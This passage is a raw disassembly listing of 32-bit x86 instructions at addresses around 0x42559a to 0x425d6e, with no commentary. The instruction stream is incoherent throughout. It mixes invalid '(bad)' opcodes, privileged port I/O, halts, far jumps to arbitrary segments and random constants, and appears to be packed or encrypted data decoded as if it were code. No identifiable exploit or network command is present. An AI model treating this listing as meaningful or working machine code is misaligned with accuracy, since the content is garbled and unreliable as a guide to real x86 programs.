  42559a:	pop    eax
  42559b:	adc    al,0xd
  42559d:	cmp    eax,0x18e6ebb5
  4255a2:	inc    ebp
  4255a3:	lods   al,BYTE PTR ds:[esi]
  4255a4:	dec    esi
  4255a5:	jns    0x4255ca
  4255a7:	jbe    0x425578
  4255a9:	cwde   
  4255aa:	js     0x4255a1
  4255ac:	sar    DWORD PTR [ebx-0x24],0xa3
  4255b0:	popf   
  4255b1:	aam    0xbd
  4255b3:	jecxz  0x4255ee
  4255b5:	xor    DWORD PTR [ebp-0x1d],edi
  4255b8:	inc    ebp
  4255b9:	pop    edx
  4255ba:	mov    al,BYTE PTR [ecx-0x2e80d5b4]
  4255c0:	pop    edx
  4255c1:	test   BYTE PTR [edi-0x5bf840bd],cl
  4255c7:	inc    ecx
  4255c8:	inc    esi
  4255c9:	sbb    ah,BYTE PTR [edx]
  4255cb:	mov    edx,0xa65d1e02
  4255d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255d1:	mov    esp,0x9b0ca6d7
  4255d6:	mov    eax,0x52bd630e
  4255db:	hlt    
  4255dc:	(bad)  
  4255dd:	dec    esp
  4255de:	ins    BYTE PTR es:[edi],dx
  4255df:	add    DWORD PTR [eax+edx*1],edi
  4255e2:	fadd   DWORD PTR [ebx-0x5a62dfbd]
  4255e8:	je     0x4255f5
  4255ea:	jae    0x4255f2
  4255ec:	in     eax,0x11
  4255ee:	out    0x44,al
  4255f0:	pusha  
  4255f1:	cmp    bl,ch
  4255f3:	pop    edi
  4255f4:	inc    ebx
  4255f5:	stc    
  4255f6:	jl     0x42561e
  4255f8:	dec    ebx
  4255f9:	mov    gs,WORD PTR [eax+0x555f20a6]
  4255ff:	xchg   ecx,eax
  425600:	dec    eax
  425601:	push   ecx
  425602:	cmc    
  425603:	jg     0x425622
  425605:	mov    esi,0x8a00393f
  42560a:	(bad)  
  42560b:	out    0x79,al
  42560d:	push   0xa1684426
  425612:	inc    eax
  425613:	pop    ebx
  425614:	jp     0x4255f2
  425616:	jae    0x4255ac
  425618:	add    edi,edi
  42561a:	jns    0x42566f
  42561c:	sbb    al,0x44
  42561e:	mov    eax,ds:0x1112fe9f
  425623:	sbb    bh,dl
  425625:	push   ecx
  425626:	cmp    bl,0x69
  425629:	fwait
  42562a:	pop    esi
  42562b:	retf   0x38ed
  42562e:	xchg   edi,eax
  42562f:	xor    al,0x91
  425631:	psllq  mm0,mm6
  425634:	jo     0x425679
  425636:	xchg   DWORD PTR [esi-0x2f],edi
  425639:	pop    esi
  42563a:	push   ss
  42563b:	jae    0x4255e4
  42563d:	mov    bl,0xae
  42563f:	pop    esi
  425640:	or     DWORD PTR [esi+edx*1+0x3f8584ce],edx
  425647:	shl    ecx,cl
  425649:	out    dx,eax
  42564a:	addr16 js 0x42561a
  42564d:	mov    eax,0xec5c8e88
  425652:	cmp    eax,0xad607e9c
  425657:	add    esp,0xed60f3a9
  42565d:	mov    esp,0x3601c3eb
  425662:	add    BYTE PTR [ecx+0x5edb0c51],dh
  425668:	test   eax,0x3705b8b5
  42566d:	jg     0x425658
  42566f:	xchg   ecx,eax
  425670:	mov    edx,0x1fdc2c10
  425675:	xchg   ebx,eax
  425676:	inc    BYTE PTR [ebp-0x12]
  425679:	push   eax
  42567a:	out    0x53,eax
  42567c:	and    eax,0x9e47e9b4
  425681:	das    
  425682:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425683:	cmp    BYTE PTR [eax],bh
  425685:	cld    
  425686:	enter  0xfd5b,0x95
  42568a:	adc    esi,esp
  42568c:	mov    bl,0x13
  42568e:	fisubr DWORD PTR [ebx]
  425690:	repnz arpl cx,dx
  425693:	add    DWORD PTR [ebx+0x24],esp
  425696:	inc    eax
  425697:	sub    al,0x9e
  425699:	adc    BYTE PTR [edi],cl
  42569b:	mov    eax,0x61feec60
  4256a0:	ficomp WORD PTR [edi+0x594b9d74]
  4256a6:	ss aaa 
  4256a8:	shr    ebx,0x18
  4256ab:	jne    0x425727
  4256ad:	pop    eax
  4256ae:	retf   
  4256af:	push   ebx
  4256b0:	adc    eax,0x418b5cff
  4256b5:	jnp    0x425647
  4256b7:	xchg   ebp,eax
  4256b8:	dec    ebx
  4256b9:	lods   eax,DWORD PTR ds:[esi]
  4256ba:	mov    esp,0x45183bf5
  4256bf:	mov    al,ds:0x6ef3b2c5
  4256c4:	xchg   DWORD PTR [ecx+0x22feaee],ebp
  4256ca:	(bad)  
  4256cc:	neg    ah
  4256ce:	data16 data16 std 
  4256d1:	loop   0x4256dd
  4256d3:	and    al,0x60
  4256d5:	scas   al,BYTE PTR es:[edi]
  4256d6:	mov    esi,0xdfbe5ac9
  4256db:	leave  
  4256dc:	cmp    DWORD PTR [edx+0x59],esi
  4256df:	inc    esp
  4256e0:	das    
  4256e1:	ror    BYTE PTR [esi+edi*4],1
  4256e4:	rcr    BYTE PTR [esp+eax*2+0x1a],0xac
  4256e9:	push   esp
  4256ea:	dec    edx
  4256eb:	sub    DWORD PTR [esp+ecx*2-0x7b54f9e],0x5f
  4256f3:	jmp    0x7aec:0x7b0480ae
  4256fa:	hlt    
  4256fb:	mov    ebp,0x5e82e459
  425700:	add    ah,bl
  425702:	repz jae 0x42571e
  425705:	mov    esp,0x52d95541
  42570a:	dec    ebx
  42570b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42570c:	and    eax,DWORD PTR [eax]
  42570e:	and    ah,dh
  425710:	cli    
  425711:	inc    edi
  425712:	add    ebp,edx
  425714:	mov    ebp,0xd552368f
  425719:	and    eax,eax
  42571b:	push   esi
  42571c:	dec    ecx
  42571d:	jbe    0x4256a9
  42571f:	ret    0xf9a2
  425722:	push   cs
  425723:	cmp    BYTE PTR [ecx],bh
  425725:	inc    edx
  425726:	shl    DWORD PTR [esi-0x7b],cl
  425729:	lea    esp,[edx-0x35]
  42572c:	mov    ch,bh
  42572e:	xor    dl,BYTE PTR [edi+0x19]
  425731:	mov    WORD PTR [ebx-0x64],fs
  425734:	inc    esp
  425735:	adc    edx,DWORD PTR [esi]
  425737:	push   esi
  425738:	das    
  425739:	push   es
  42573a:	jnp    0x425795
  42573c:	loopne 0x4257b9
  42573e:	dec    esi
  42573f:	in     al,dx
  425740:	push   esp
  425741:	cmp    edi,edx
  425743:	test   edi,esi
  425745:	repz xor DWORD PTR [edi-0x2ad08a11],esp
  42574c:	jle    0x425766
  42574e:	aaa    
  42574f:	aaa    
  425750:	and    dl,dh
  425752:	push   ebp
  425753:	add    ebp,DWORD PTR [edi+eax*1-0x36]
  425757:	test   ch,dh
  425759:	btc    DWORD PTR [ebx],esi
  42575c:	cmp    BYTE PTR [eax-0xf],al
  42575f:	mov    al,0xe2
  425761:	pop    ds
  425762:	xchg   ebp,eax
  425763:	cld    
  425764:	or     BYTE PTR [ebx+0x68],0xf4
  425768:	or     ecx,DWORD PTR [edi]
  42576a:	push   ss
  42576b:	add    ebp,ecx
  42576d:	xchg   BYTE PTR [ebx+0x76],al
  425770:	repnz sub al,dh
  425773:	xchg   ecx,eax
  425774:	loop   0x4257cb
  425776:	mov    esp,0x12e8e060
  42577b:	fs xchg esi,eax
  42577d:	jns    0x4257fb
  42577f:	cmp    BYTE PTR [ebx],bl
  425781:	and    DWORD PTR [eax],eax
  425783:	pop    es
  425784:	ds jno 0x4257c6
  425787:	sub    eax,DWORD PTR [ecx+eax*4-0x30]
  42578b:	inc    eax
  42578c:	neg    DWORD PTR [edi-0x741359d]
  425792:	jae    0x425750
  425794:	test   dl,al
  425796:	jno    0x425793
  425798:	xchg   DWORD PTR [esi+0x4f],edx
  42579b:	(bad)  
  42579c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42579d:	cs lahf 
  42579f:	sbb    al,al
  4257a1:	lock add WORD PTR [eax-0x13],0x9d21
  4257a8:	mov    ch,0xf5
  4257aa:	push   edx
  4257ab:	(bad)  
  4257ad:	adc    ebx,DWORD PTR [ebx+esi*8+0x7e58bfe4]
  4257b4:	sbb    dl,BYTE PTR [ecx]
  4257b6:	cmp    al,0xb6
  4257b8:	push   edx
  4257b9:	add    al,0x18
  4257bb:	mov    bh,0xa7
  4257bd:	out    0xdb,eax
  4257bf:	add    al,0xf
  4257c1:	aad    0xdd
  4257c3:	lods   eax,DWORD PTR ds:[esi]
  4257c4:	sbb    BYTE PTR [edx+0x64],ch
  4257c7:	pop    ecx
  4257c8:	jne    0x425773
  4257ca:	test   eax,0xca443153
  4257cf:	and    eax,esp
  4257d1:	inc    edi
  4257d2:	enter  0xd9ea,0xcc
  4257d6:	shl    BYTE PTR [edi-0x31],1
  4257d9:	sub    eax,0x4b78d4bb
  4257de:	pusha  
  4257df:	test   BYTE PTR [ebp+0x21],ch
  4257e2:	mov    dh,0xbf
  4257e4:	mov    edx,0xda9bea29
  4257e9:	mov    esi,0x3bdff52d
  4257ee:	int3   
  4257ef:	inc    ecx
  4257f0:	xor    DWORD PTR [ebx+0x20],0x687ebfc2
  4257f7:	cmc    
  4257f8:	bound  eax,QWORD PTR [eax+0x4d2e7dd]
  4257fe:	test   ch,ch
  425800:	aaa    
  425801:	ret    0x54b1
  425804:	mov    esi,0xd10e24b
  425809:	cmp    bl,BYTE PTR [ebx+0x47f1b7d8]
  42580f:	lods   eax,DWORD PTR ds:[esi]
  425810:	or     edi,edx
  425812:	xlat   BYTE PTR ds:[ebx]
  425813:	mov    al,ds:0x98d0f89f
  425818:	inc    edi
  425819:	mov    dh,0x6f
  42581b:	mov    eax,ecx
  42581d:	push   ebp
  42581e:	lds    esp,FWORD PTR [edi+0x20b1c2d6]
  425824:	pushf  
  425825:	adc    ebx,DWORD PTR [eax+0x29de9ae7]
  42582b:	xor    BYTE PTR [edi+esi*1-0x2],dl
  42582f:	and    DWORD PTR [esi+0x24d57f3c],ecx
  425835:	and    esp,DWORD PTR [edx-0x91b3e9b]
  42583b:	inc    eax
  42583c:	mov    eax,0xf305b429
  425841:	pop    eax
  425842:	idiv   DWORD PTR ds:0x592999b4
  425848:	aaa    
  425849:	mul    BYTE PTR [ecx+0x299d691e]
  42584f:	add    eax,0xeebb137f
  425854:	leave  
  425855:	aad    0xca
  425857:	imul   edx,DWORD PTR [edi],0x3a
  42585a:	and    ebx,esi
  42585c:	sbb    dh,al
  42585e:	push   eax
  42585f:	jbe    0x425884
  425861:	xchg   BYTE PTR [ecx],cl
  425863:	lods   al,BYTE PTR ds:[esi]
  425864:	ins    BYTE PTR es:[edi],dx
  425865:	mov    eax,ds:0x1d8a79a6
  42586a:	sbb    dh,0xed
  42586d:	je     0x42582f
  42586f:	mov    eax,ds:0xf381746c
  425874:	cmp    esp,DWORD PTR [edx+0x7974aa76]
  42587a:	scas   al,BYTE PTR es:[edi]
  42587b:	mov    ch,0x1d
  42587d:	cmp    al,0xe4
  42587f:	pushf  
  425880:	mov    bl,0x21
  425882:	outs   dx,BYTE PTR ds:[esi]
  425883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425884:	inc    esi
  425885:	and    dl,dh
  425887:	psrlq  mm2,mm4
  42588a:	fidiv  WORD PTR [eax-0x3bd62fdf]
  425890:	xor    ebx,ebx
  425892:	mov    edx,0x94451df3
  425897:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425899:	push   ebp
  42589a:	jle    0x42585a
  42589c:	fdivr  DWORD PTR [edx+0x7c]
  42589f:	mov    eax,0x2b209167
  4258a4:	cdq    
  4258a5:	pusha  
  4258a6:	inc    ecx
  4258a7:	shl    DWORD PTR [edx+0x5e],cl
  4258aa:	xchg   edi,eax
  4258ab:	adc    dh,BYTE PTR [esi]
  4258ad:	xlat   BYTE PTR ds:[ebx]
  4258ae:	mov    edx,0xf349972f
  4258b3:	stos   BYTE PTR es:[edi],al
  4258b4:	mov    dh,0xbf
  4258b6:	cmp    ebp,ebx
  4258b8:	cmp    al,0xb5
  4258ba:	lahf   
  4258bb:	out    0xe7,al
  4258bd:	jo     0x4258a7
  4258bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258c0:	inc    ecx
  4258c1:	sub    ebx,0xec236d23
  4258c7:	je     0x425907
  4258c9:	lds    ebx,FWORD PTR [edi]
  4258cb:	push   esp
  4258cc:	outs   dx,DWORD PTR ds:[esi]
  4258cd:	dec    eax
  4258ce:	jg     0x4258c7
  4258d0:	das    
  4258d1:	enter  0x896c,0x6e
  4258d5:	jno    0x4258fb
  4258d7:	cs call 0x585b2214
  4258dd:	pushf  
  4258de:	mov    esi,0xf09a1fa4
  4258e3:	sbb    al,0x1b
  4258e5:	push   ds
  4258e6:	xor    DWORD PTR [ebx],0x60
  4258e9:	stos   DWORD PTR es:[edi],eax
  4258ea:	inc    eax
  4258eb:	sub    cl,BYTE PTR [edx]
  4258ed:	push   0x62e99add
  4258f2:	xchg   edi,eax
  4258f3:	mov    cs,ecx
  4258f5:	cwde   
  4258f6:	icebp  
  4258f7:	push   ds
  4258f8:	add    bh,BYTE PTR [ebp+eax*2-0x38]
  4258fc:	inc    WORD PTR [ecx]
  4258ff:	stc    
  425900:	inc    esp
  425901:	dec    ecx
  425902:	add    al,0x25
  425904:	popa   
  425905:	pop    esi
  425906:	dec    ebp
  425907:	cs mov ecx,ss
  42590a:	push   ss
  42590b:	mov    ds:0xdda6800d,al
  425910:	scas   al,BYTE PTR es:[edi]
  425911:	imul   ecx,DWORD PTR [edx-0x2a],0x3e928e4
  425918:	lods   al,BYTE PTR ds:[esi]
  425919:	sti    
  42591a:	pop    ss
  42591b:	dec    esi
  42591c:	scas   eax,DWORD PTR es:[edi]
  42591d:	clc    
  42591e:	sbb    esi,DWORD PTR [eax-0x298f212f]
  425924:	cmp    BYTE PTR [ecx-0x6a],0xa6
  425928:	add    DWORD PTR [eax-0x53872122],edi
  42592e:	addr16 lock mov ?,esi
  425932:	jmp    0x42597d
	...
  42593f:	add    BYTE PTR [eax],al
  425941:	in     al,dx
  425942:	test   BYTE PTR [eax-0x5f],ah
  425945:	push   0xedcdede5
  42594a:	cld    
  42594b:	mov    BYTE PTR [ebx+0x572dc40f],ah
  425951:	and    al,dl
  425953:	add    DWORD PTR [eax],eax
  425955:	stos   DWORD PTR es:[edi],eax
  425956:	add    eax,DWORD PTR [eax]
  425958:	add    BYTE PTR [ecx+0x5a],ah
  42595b:	push   cs
  42595c:	scas   al,BYTE PTR es:[edi]
  42595d:	mov    eax,DWORD PTR [esi]
  42595f:	push   edi
  425960:	ret    0x7ab3
  425963:	scas   eax,DWORD PTR es:[edi]
  425964:	stos   DWORD PTR es:[edi],eax
  425965:	fdivr  DWORD PTR [eax]
  425967:	xlat   BYTE PTR ds:[ebx]
  425968:	pop    ecx
  425969:	xchg   edi,eax
  42596a:	out    dx,al
  42596b:	in     eax,dx
  42596c:	xor    ah,ah
  42596e:	pop    ebp
  42596f:	iret   
  425970:	test   cl,cl
  425972:	push   ecx
  425973:	enter  0x29c,0x87
  425977:	push   eax
  425978:	nop
  425979:	mov    edx,eax
  42597b:	pop    esi
  42597c:	push   0xfd9481db
  425981:	cmp    DWORD PTR [esp+eax*1],ebp
  425984:	hlt    
  425985:	popf   
  425986:	xchg   ebp,eax
  425987:	cwde   
  425988:	mov    ds:0xac8cde5b,eax
  42598d:	xchg   esi,eax
  42598e:	push   edi
  42598f:	add    BYTE PTR [edx],dl
  425991:	dec    esi
  425992:	rcr    BYTE PTR [edx-0x53046b2d],cl
  425998:	pop    es
  425999:	rcl    DWORD PTR [esi+0x19],1
  42599c:	cwde   
  42599d:	fdivr  DWORD PTR ds:0x86f1dc3b
  4259a3:	push   0x5eece57c
  4259a8:	out    dx,eax
  4259a9:	ds dec ecx
  4259ab:	or     ecx,DWORD PTR [edi-0x3a4a2e60]
  4259b1:	int3   
  4259b2:	xchg   edi,eax
  4259b3:	xor    ch,BYTE PTR [eax]
  4259b5:	jb     0x4259c4
  4259b7:	lods   al,BYTE PTR ds:[esi]
  4259b8:	rcr    DWORD PTR [esi+edx*4+0x225efc9a],cl
  4259bf:	sub    ecx,edi
  4259c1:	stos   BYTE PTR es:[edi],al
  4259c2:	ret    0x3bb
  4259c5:	and    al,BYTE PTR [ecx-0x68]
  4259c8:	test   BYTE PTR ds:0xa84ca80c,bl
  4259ce:	dec    esi
  4259cf:	mov    ds:0xf4a02a82,eax
  4259d4:	xor    BYTE PTR [ebp+0x77],0xf8
  4259d8:	sbb    al,0xbe
  4259da:	push   cs
  4259db:	pop    ecx
  4259dc:	jmp    0x2adc:0x2ce28979
  4259e3:	out    dx,eax
  4259e4:	cmp    eax,0x3b4bf390
  4259e9:	xlat   BYTE PTR ds:[ebx]
  4259ea:	lock xor eax,0x77ca144d
  4259f0:	loope  0x4259c1
  4259f2:	sar    eax,1
  4259f4:	cmp    al,0xe0
  4259f6:	je     0x425a0a
  4259f8:	dec    bp
  4259fa:	inc    eax
  4259fb:	cmp    eax,0x7b993831
  425a00:	mov    ah,dl
  425a02:	cmovo  ebx,DWORD PTR [edi+eiz*4]
  425a06:	pcmpgtb mm4,QWORD PTR [ecx]
  425a09:	mov    esp,ebp
  425a0b:	jecxz  0x4259aa
  425a0d:	das    
  425a0e:	loopne 0x425a49
  425a10:	int3   
  425a11:	clc    
  425a12:	sub    eax,0x285fedcd
  425a17:	fldcw  WORD PTR [edi]
  425a19:	pop    DWORD PTR ds:0xdb4c8ed8
  425a1f:	and    eax,0x7bc6a284
  425a24:	or     eax,0xf547ad7e
  425a29:	or     al,0x6
  425a2b:	xchg   edi,eax
  425a2c:	adc    bl,BYTE PTR [ebx-0x62]
  425a2f:	dec    ebx
  425a30:	jmp    0x4259d9
  425a32:	jmp    0x10aa:0xee1c5f25
  425a39:	mov    ebp,0x15743454
  425a3e:	shr    BYTE PTR [ebx+0x1a09e832],1
  425a44:	add    BYTE PTR [edi+0x56],dh
  425a47:	sti    
  425a48:	ja     0x425a8c
  425a4a:	lea    edi,[ebx-0x6afe0159]
  425a50:	arpl   si,si
  425a52:	shr    BYTE PTR [ecx+0x19],0x7a
  425a56:	cld    
  425a57:	std    
  425a58:	mov    esi,esi
  425a5a:	out    dx,al
  425a5b:	push   ebx
  425a5c:	ins    BYTE PTR es:[edi],dx
  425a5d:	dec    edx
  425a5e:	(bad)  
  425a5f:	or     al,0xe6
  425a61:	loope  0x425a54
  425a63:	ret    
  425a64:	or     ebp,edx
  425a66:	pmaxub mm6,QWORD PTR [edi+0x3ce88756]
  425a6d:	push   edx
  425a6e:	test   DWORD PTR [ebp+0x37441271],esp
  425a74:	jg     0x425ae6
  425a76:	sbb    BYTE PTR [ebx-0x2d],al
  425a79:	in     al,0xd3
  425a7b:	pop    esp
  425a7c:	xchg   BYTE PTR [esi-0x33],dh
  425a7f:	daa    
  425a80:	fld    QWORD PTR [edx+0x4]
  425a83:	cmp    dl,BYTE PTR [esi+ecx*1-0x25c3c32c]
  425a8a:	mov    dh,0x54
  425a8c:	pop    ss
  425a8d:	stos   BYTE PTR es:[edi],al
  425a8e:	js     0x425ae3
  425a90:	outs   dx,DWORD PTR ds:[esi]
  425a91:	hlt    
  425a92:	scas   al,BYTE PTR es:[edi]
  425a93:	cmp    eax,0x7b361003
  425a98:	loop   0x425a82
  425a9a:	cmp    ebp,esp
  425a9c:	into   
  425a9d:	xchg   ecx,eax
  425a9e:	retf   
  425a9f:	cli    
  425aa0:	inc    dh
  425aa2:	xor    dh,BYTE PTR [ebx-0x19ba7c37]
  425aa8:	iret   
  425aa9:	push   ds
  425aaa:	call   DWORD PTR [edx]
  425aac:	sub    DWORD PTR [ebx],esi
  425aae:	gs push cs
  425ab0:	push   ecx
  425ab1:	fwait
  425ab2:	stos   BYTE PTR es:[edi],al
  425ab3:	loopne 0x425aeb
  425ab5:	sbb    eax,DWORD PTR [ecx-0x1a]
  425ab8:	xlat   BYTE PTR ds:[ebx]
  425ab9:	aam    0x9
  425abb:	adc    eax,DWORD PTR [ebx]
  425abd:	gs jae 0x425a91
  425ac0:	(bad)  
  425ac1:	cmp    eax,0x99d96d68
  425ac6:	mov    ch,BYTE PTR [esi]
  425ac8:	jne    0x425b0b
  425aca:	rcl    esp,0x34
  425acd:	pop    eax
  425ace:	lds    eax,FWORD PTR [eax+0x7ff997af]
  425ad4:	test   eax,0xa0cb3168
  425ad9:	inc    ecx
  425ada:	cdq    
  425adb:	leave  
  425adc:	inc    edi
  425add:	cmp    DWORD PTR [ecx-0x288d5439],edx
  425ae3:	frstor [esi+0x7f]
  425ae6:	pop    esp
  425ae7:	adc    ebx,esi
  425ae9:	inc    ecx
  425aea:	mov    ebx,0x55725f13
  425aef:	cmp    BYTE PTR [edi-0x50],0x5a
  425af3:	mov    DWORD PTR [eax+eiz*2+0x782f1aa6],ebx
  425afa:	loopne 0x425aad
  425afc:	jo     0x425b46
  425afe:	sbb    DWORD PTR [edx-0x443d58dd],esi
  425b04:	jmp    0x425ae1
  425b06:	int    0x58
  425b08:	push   ecx
  425b09:	out    dx,eax
  425b0a:	in     al,0xb6
  425b0c:	xchg   ebp,eax
  425b0d:	int3   
  425b0e:	mov    eax,ds:0x9ed313fd
  425b13:	ror    edi,cl
  425b15:	add    DWORD PTR [edi-0x7d],0xf8bbd969
  425b1c:	mov    al,ds:0x9b104e69
  425b21:	xchg   DWORD PTR [edi],edx
  425b23:	not    ebx
  425b25:	cmc    
  425b26:	cmp    eax,0xbf2de034
  425b2b:	cwde   
  425b2c:	sub    al,0xe9
  425b2e:	push   ds
  425b2f:	or     DWORD PTR [ebx],0x74b7671
  425b35:	stos   BYTE PTR es:[edi],al
  425b36:	outs   dx,DWORD PTR ds:[esi]
  425b37:	sbb    BYTE PTR [ecx-0x196337a6],ch
  425b3d:	sub    al,0xa8
  425b3f:	jno    0x425b27
  425b41:	inc    edi
  425b42:	pop    ebp
  425b43:	jp     0x425b96
  425b45:	enter  0xb8a,0x3d
  425b49:	dec    esi
  425b4a:	scas   eax,DWORD PTR es:[edi]
  425b4b:	pop    ecx
  425b4c:	fidivr WORD PTR [edx+0x24]
  425b4f:	imul   esi,DWORD PTR [ebp+0x1ac497f7],0xbd108fa7
  425b59:	retf   0xee25
  425b5c:	arpl   bp,si
  425b5e:	call   0x7172:0xd60b08e4
  425b65:	adc    eax,0xf01e7e6e
  425b6a:	mov    edx,0x27d2f85f
  425b6f:	dec    edx
  425b70:	out    dx,al
  425b71:	and    eax,0x7ad66768
  425b76:	sbb    ebp,esi
  425b78:	call   0x205f0b6f
  425b7d:	xor    al,0xf4
  425b7f:	or     al,BYTE PTR [edi+0x32]
  425b82:	mov    bl,0xe1
  425b84:	fsubp  st(1),st
  425b86:	fbstp  TBYTE PTR [ebp+0x3efddea]
  425b8c:	cmp    DWORD PTR ds:0x60abd442,0xffffffd7
  425b93:	out    dx,eax
  425b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b95:	mov    al,0xdf
  425b97:	jg     0x425bc0
  425b99:	dec    edx
  425b9a:	cmp    eax,DWORD PTR [edi-0x23db84ca]
  425ba0:	xchg   DWORD PTR ds:0xa3078776,esp
  425ba6:	pop    ds
  425ba7:	dec    ebx
  425ba8:	popf   
  425ba9:	pusha  
  425baa:	inc    edx
  425bab:	xchg   ebx,eax
  425bac:	inc    eax
  425bad:	mov    al,0x7f
  425baf:	shr    DWORD PTR [ecx*1+0x70585a4f],1
  425bb6:	neg    DWORD PTR [ecx+0x32]
  425bb9:	pop    esi
  425bba:	cmp    al,0x23
  425bbc:	call   0x251dd0b4
  425bc1:	mov    ebx,0x9e180db
  425bc6:	aad    0x22
  425bc8:	cmc    
  425bc9:	das    
  425bca:	or     esi,DWORD PTR [edi-0x661f3b68]
  425bd0:	int3   
  425bd1:	idiv   BYTE PTR [ecx]
  425bd3:	pop    ebp
  425bd4:	retf   0x2db5
  425bd7:	cmp    BYTE PTR [ebx+eax*4],bh
  425bda:	mov    edi,0x4a0bfef6
  425bdf:	mov    edx,0xe3c848fc
  425be4:	and    bh,cl
  425be6:	mov    WORD PTR [esi-0x4],gs
  425be9:	sub    DWORD PTR [ebx-0x5],0x40
  425bed:	aad    0xbe
  425bef:	xor    eax,0xd6cd0998
  425bf4:	les    esi,FWORD PTR [ebp-0x5b]
  425bf7:	cmp    esi,DWORD PTR [esp+esi*2-0x3068759d]
  425bfe:	push   cs
  425bff:	jo     0x425bc8
  425c01:	jns    0x425bdc
  425c03:	pop    eax
  425c04:	xchg   ebx,eax
  425c05:	fwait
  425c06:	jp     0x425c7d
  425c08:	add    eax,0x7e92334f
  425c0d:	sti    
  425c0e:	lahf   
  425c0f:	add    BYTE PTR [edx-0x5d],dh
  425c12:	int    0xd4
  425c14:	dec    edx
  425c15:	add    bh,ch
  425c17:	aas    
  425c18:	or     eax,0x6ad8ca59
  425c1d:	stc    
  425c1e:	add    BYTE PTR [ebx],0xdf
  425c21:	int3   
  425c22:	mov    eax,0x9e08ab69
  425c27:	jns    0x425bfd
  425c29:	pop    ss
  425c2a:	sbb    dl,BYTE PTR [ebp-0x4e58fcfa]
  425c30:	sub    edx,edi
  425c32:	pop    eax
  425c33:	ror    ebp,1
  425c35:	and    bh,BYTE PTR [ebx+0x78518d69]
  425c3b:	fild   QWORD PTR [eax-0x5f4d3350]
  425c41:	and    al,0x22
  425c43:	pop    ds
  425c44:	mov    edx,0x6f0271
  425c49:	fmul   st,st(0)
  425c4b:	mov    esp,es
  425c4d:	xor    DWORD PTR [ecx+0xa681372],esp
  425c53:	push   cs
  425c54:	xchg   edx,eax
  425c55:	outs   dx,DWORD PTR ds:[esi]
  425c56:	mov    ds:0xe4ede0d7,al
  425c5b:	add    DWORD PTR [ebp+esi*1-0x5e],0xfbe3950b
  425c63:	sbb    bl,BYTE PTR ds:0x22f7666a
  425c69:	gs je  0x425cc6
  425c6c:	jae    0x425c16
  425c6e:	(bad)  
  425c70:	xlat   BYTE PTR ds:[ebx]
  425c71:	pop    ds
  425c72:	inc    edi
  425c73:	jnp    0x425c88
  425c75:	cmc    
  425c76:	adc    DWORD PTR [ecx+ecx*8+0x5e],0x2ce12a48
  425c7e:	repnz add DWORD PTR [edi*2-0x669d3d12],0xbec78a84
  425c8a:	jb     0x425c9c
  425c8c:	fcomp  DWORD PTR es:[ecx+0x76]
  425c90:	mov    ds,WORD PTR [eax+0x5]
  425c93:	(bad)
  425c96:	mov    ds:0x289949b9,eax
  425c9b:	cld    
  425c9c:	inc    ebp
  425c9d:	mov    al,ds:0x40c2bc11
  425ca2:	loope  0x425c6d
  425ca4:	mov    esp,ss
  425ca6:	pop    ebp
  425ca7:	adc    esi,DWORD PTR [esi-0x36]
  425caa:	je     0x425cd8
  425cac:	sti    
  425cad:	repnz or DWORD PTR es:[edx-0x1f32e46b],esi
  425cb5:	xor    al,0xdd
  425cb7:	sbb    eax,DWORD PTR [ebp-0x1bc37b6e]
  425cbd:	xchg   DWORD PTR [edi+0x1b7e2640],edx
  425cc3:	icebp  
  425cc4:	mov    edi,0x2b4ea0bb
  425cc9:	xchg   BYTE PTR [ebx],ch
  425ccb:	stc    
  425ccc:	jbe    0x425ca8
  425cce:	sbb    esi,DWORD PTR [edi]
  425cd0:	pop    edx
  425cd1:	fistp  DWORD PTR [ebp+0x8]
  425cd4:	(bad)  
  425cd5:	(bad)  
  425cd6:	mov    ecx,0x36901fde
  425cdb:	mov    ah,0xfe
  425cdd:	xchg   ebp,eax
  425cde:	adc    DWORD PTR ds:0xf3594103,esp
  425ce4:	retf   0x6ee9
  425ce7:	mov    dl,0xdd
  425ce9:	pop    ebp
  425cea:	pop    eax
  425ceb:	fmul   DWORD PTR [edi]
  425ced:	jge    0x425ce6
  425cef:	mov    ebp,0x6af91b15
  425cf4:	pop    ebp
  425cf5:	shl    DWORD PTR [edx+eiz*4-0x2a],0x13
  425cfa:	mov    esp,esi
  425cfc:	dec    eax
  425cfd:	repnz adc ebp,esi
  425d00:	stos   DWORD PTR es:[edi],eax
  425d01:	das    
  425d02:	lds    ebx,FWORD PTR [edi+0x0]
	...
  425d10:	add    BYTE PTR [edx+0x51],bl
  425d13:	leave  
  425d14:	popf   
  425d15:	retf   
  425d16:	popf   
  425d17:	pop    esi
  425d18:	xlat   BYTE PTR ds:[ebx]
  425d19:	loope  0x425d6f
  425d1b:	fs lock adc ah,bh
  425d1f:	push   cs
  425d20:	adc    ecx,ebx
  425d22:	rol    DWORD PTR [ecx],cl
  425d24:	add    BYTE PTR [ebx+0x53000003],ch
  425d2a:	aam    0x8c
  425d2c:	in     al,dx
  425d2d:	bound  esp,QWORD PTR [esp+edi*8+0x6e]
  425d31:	aam    0xe5
  425d33:	imul   esi,DWORD PTR [eax+0x7d],0xcbac0e8f
  425d3a:	fwait
  425d3b:	std    
  425d3c:	lock stc 
  425d3e:	ds gs fwait
  425d41:	stos   DWORD PTR es:[edi],eax
  425d42:	out    0xe0,eax
  425d44:	stos   DWORD PTR es:[edi],eax
  425d45:	push   esp
  425d46:	mov    cl,0x3c
  425d48:	lds    esp,FWORD PTR [edx]
  425d4a:	sub    esi,DWORD PTR [eax]
  425d4c:	retf   
  425d4d:	inc    ebp
  425d4e:	in     al,dx
  425d4f:	iret   
  425d50:	mov    al,0x53
  425d52:	xor    BYTE PTR [esp+edx*2],ah
  425d55:	cli    
  425d56:	aas    
  425d57:	clc    
  425d58:	adc    al,0x8c
  425d5a:	sbb    al,0x75
  425d5c:	mov    WORD PTR [edx-0x61],?
  425d5f:	gs ds in eax,dx
  425d62:	imul   esi,DWORD PTR [ebx+0x43aa315a],0xffffffcc
  425d69:	test   BYTE PTR [edi],ch
  425d6b:	inc    ebp
  425d6c:	pop    ebx
  425d6d:	pop    ds
  425d6e:	arpl   WORD PTR [ebx+0x30],di
